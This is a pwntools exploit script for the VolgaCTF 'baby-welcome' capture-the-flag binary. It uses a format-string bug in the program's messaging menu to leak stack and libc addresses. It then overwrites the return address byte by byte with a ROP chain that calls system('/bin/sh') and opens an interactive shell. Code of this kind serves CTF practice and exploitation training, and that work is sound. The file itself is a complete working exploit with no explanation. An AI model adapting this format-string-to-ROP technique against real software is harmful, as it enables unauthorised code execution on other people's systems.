from pwn import *
from icecream import ic

elf = exe = ELF("./baby-welcome")
libc = ELF("./libc.so.6")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("baby-welcome-1.q.2025.volgactf.ru", 31338)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *print_messages+41
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

def make_acc(name, password):
    sla(b">", b"1")
    sla(b"Login: ", name)
    sla(b"Password: ", password)

def logout():
    sla(b">", b"3")

def send_msg(recipient, msg):
    sla(b">", b"1")
    sla(b"Login:", recipient)
    sla(b"Message: ", msg)

def read_msg():
    sla(b">", b"2")
    ru(": ")

def login(name, password):
    sla(b">", b"2")
    sla(b"Login: ", name)
    sla(b"Password: ", password)

make_acc('a', 'a')
logout()
make_acc('b', 'b')

send_msg('a', '%8$p')

logout()
login('a', 'a')
read_msg()
stack_leak = int(rl().strip(), 16) + 0xc8

logout()
make_acc('c', 'c')
send_msg('b', '%17$p')

logout()
login('b', 'b')
read_msg()
libc.address = int(rl().strip(), 16) - 0x2a3b8

ic(hex(stack_leak))
ic(hex(libc.address))

logout()
make_acc('d', 'd')
logout()

off = 8
stack_leak = stack_leak & 0xffff
stack_leak = stack_leak - 0xa0
ic(hex(stack_leak))

x = ord(b'd')


def write(inp2, retaddr):
    global x
    ic(hex(inp2))
    test = str(hex(inp2)[2:])
    test2 = int(test[-4:-2], 16)
    test3 = int(test[-6:-4], 16)
    test4 = int(test[-8:-6], 16)
    test5 = int(test[-10:-8], 16)
    test6 = int(test[-12:-10], 16)
    test = int(test[-2:], 16)
    l = [test6, test5, test4, test3, test2, test]
    ic(l)
    for i in range(6):
        make_acc(chr(x+1), chr(x+1))
        logout()
        login(chr(x), chr(x))
        payload = f'%{retaddr + (i) - off}c%16$hn'
        send_msg(chr(x+1), payload)
        logout()
        login(chr(x+1), chr(x+1))
        read_msg()
        logout()

        login(chr(x), chr(x))
        payload = f"%{l.pop() - off}c%36$hhn".encode()
        send_msg(chr(x+1), payload)
        logout()
        login(chr(x+1), chr(x+1))
        read_msg()
        logout()
        x += 1

ic(hex(qgad(libc, "rdi")))
write(qgad(libc, "rdi"), stack_leak)
write(binsh(libc), stack_leak + 8)
write(gad(libc, ['ret']), stack_leak + 16)
write(libc.symbols['system'], stack_leak + 24)




io.interactive()
